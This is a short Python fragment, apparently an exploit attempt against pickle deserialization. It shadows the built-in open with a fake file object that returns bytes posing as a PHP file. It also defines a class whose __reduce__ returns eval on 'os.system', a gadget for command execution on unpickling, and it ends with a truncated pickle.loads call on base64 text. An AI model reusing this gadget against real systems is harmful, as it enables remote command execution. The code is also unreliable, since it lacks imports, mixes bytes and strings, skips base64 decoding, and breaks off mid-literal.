import io
class File(io.RawIOBase):
    def read(self, *args):
        return "PHP \x00\x0a\x00\x00T\x00h\x00i\x00s\x00\x20\x00i\x00s\x00\x20\x00a\x00\x20\x00p\x00h\x00p\x00\x20\x00f\x00i\x00l\x00e\x00\x21\x00\x00\x00"
    def seekable(self):
        return True
    def readable(self):
        return True
    def seek(self, to):
        pass

open = File()

class Array(list):
    def __reduce__(self):
        return (eval,(b"os.system",))

class Object(object):
    def __getattribute__(self, item):
        if item.strip() == b"arr":
            return Array()

pickle.loads(b'gAN9cQBYDAAAAAl0ZXh0L2phdm
